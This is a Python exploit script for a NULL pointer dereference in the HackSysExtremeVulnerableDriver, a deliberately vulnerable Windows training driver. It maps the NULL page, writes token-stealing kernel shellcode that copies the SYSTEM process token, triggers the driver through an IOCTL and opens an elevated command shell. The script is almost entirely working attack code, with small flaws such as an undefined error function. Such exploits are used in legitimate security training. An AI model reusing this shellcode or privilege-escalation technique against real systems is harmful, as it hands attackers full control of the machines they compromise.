import ctypes, sys, struct
from ctypes import *
from subprocess import *

GENERIC_READ     = 0x80000000
GENERIC_WRITE    = 0x40000000
FILE_SHARE_READ  = 0x00000001
FILE_SHARE_WRITE = 0x00000002
NULL = 0x0 
OPEN_EXISTING = 0x3
baseadd = c_int(0x00000004)
null_size = c_int(0x3000)
STATUS_SUCCESS = 0x0

def hevd_null_pointer_derefence_exploit():

    kernel32              = windll.kernel32
    psapi                 = windll.Psapi
    ntdll                 = windll.ntdll

    lpFileName            = "\\\\.\HackSysExtremeVulnerableDriver"
    device_handle = kernel32.CreateFileA("\\\\.\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

    if not device_handle or device_handle == -1:
        print("[!] Error creating Device handle:" + ctypes.GetLastError())
        sys.exit()
    else:
        print("[+] Device handler setup successful")
        print("[+] Device handle in use: %s" %lpFileName)

    dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
    if dwStatus != STATUS_SUCCESS:
        print("[+] Failed allocating the null paged memory: %s" % dwStatus)
        getLastError()
    else:
        print("[+] Successfully allocated NULL memory page")
        
    shellcode = bytearray(
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC3"                          # ret
    )

    ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))

    payload_address = id(shellcode) + 20
    payload_updated = struct.pack("<L", ptr)
    payload_final = id(payload_updated) + 20
    print("[+] Writing ring0 pointer {0} in location 0x4...".format(hex(payload_final)))
    if kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, payload_final, 0x400, byref(c_ulong())): # 2nd entry is the location ADDR to write to
        print("[+] success writing to memory")
            
    buf = '\x41\x41\x41\x41'
    bufLength = len(buf)

    kernel32.DeviceIoControl(device_handle, 0x22202b, buf, bufLength, None, 0, byref(c_ulong()), None)
    print("[+] Payload sent... Enjoy your shell!")
    Popen("start cmd", shell=True)

if __name__ == '__main__':
    print("\n\/\/ HEVD - NULL Pointer Dereference Exploit \/\/\n")
    print("[+] Starting exploit...")
    hevd_null_pointer_derefence_exploit()
